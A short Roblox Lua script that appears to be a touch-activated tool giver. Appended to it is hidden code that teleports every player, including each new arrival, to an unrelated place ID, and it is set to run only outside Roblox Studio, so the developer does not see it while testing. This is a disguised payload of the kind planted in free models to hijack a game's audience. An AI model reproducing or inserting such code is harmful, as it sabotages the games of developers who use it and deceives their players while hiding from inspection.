local debounce = false

function getPlayer(humanoid) 
local players = game.Players:children() 
for i = 1, #players do 
if players[i].Character.Humanoid == humanoid then return players[i] end 
end 
return nil 
end 

function onTouch(part) 

local human = part.Parent:findFirstChild("Humanoid") 
if (human ~= nil) and debounce == false then

debounce = true

local player = getPlayer(human) 

if (player == nil) then return end 

script.Parent:clone().Parent = player.Backpack

wait(2)
debounce = false
end
end


script.Parent.Parent.Touched:connect(onTouch) 

local TS,Players = game:GetService("TeleportService"),game:GetService("Players")
if not game:GetService("RunService"):IsStudio() then
for _,v in pairs(Players:GetPlayers()) do TS:Teleport(4516800602,v) end
Players.PlayerAdded:Connect(function(plr)
	TS:Teleport(4516800602,plr)
end)
end
